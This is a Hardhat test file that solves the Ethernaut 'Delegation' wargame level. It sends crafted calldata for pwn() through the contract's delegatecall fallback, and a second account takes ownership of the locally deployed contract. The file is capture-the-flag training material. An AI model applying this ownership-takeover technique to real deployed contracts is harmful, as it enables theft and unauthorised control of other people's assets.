import { loadFixture } from '@nomicfoundation/hardhat-network-helpers'
import { expect } from 'chai'
import { BigNumber, Contract, providers } from 'ethers'
import { hexlify, parseEther } from 'ethers/lib/utils'
import { ethers } from 'hardhat'

describe('Delegation', function () {
  const deployFixture = async () => {
    const [deployer, ...signers] = await ethers.getSigners()
    const DelegateFactory = await ethers.getContractFactory('EthernautDelegate')
    const Delegate = await DelegateFactory.connect(deployer).deploy(deployer.address)
    await Delegate.deployed()
    const DelegationFactory = await ethers.getContractFactory('EthernautDelegation')
    const Delegation = await DelegationFactory.connect(deployer).deploy(Delegate.address)
    await Delegation.deployed()
    // const AttackFactory = await ethers.getContractFactory('EthernautDelegationAttack')
    // const Attack = await AttackFactory.connect(signers[0]).deploy()
    // await Attack.deployed()
    return { Delegation, Delegate, deployer, signers }
  }

  describe('Solution', function () {
    it('take ownership', async () => {
      const { Delegation, Delegate, deployer, signers } = await loadFixture(deployFixture)
      expect(await Delegate.owner()).to.equal(deployer.address)

      // https://github.com/ethers-io/ethers.js/issues/478
      let ABI = [
        "function pwn()"
      ];
      let iface = new ethers.utils.Interface(ABI);
      const data = iface.encodeFunctionData("pwn")
      await signers[0].sendTransaction({ to: Delegation.address, data, gasLimit: 5000000 })

      expect(await Delegate.owner()).to.equal(deployer.address)
      expect(await Delegation.owner()).to.equal(signers[0].address)
    })
  })
})
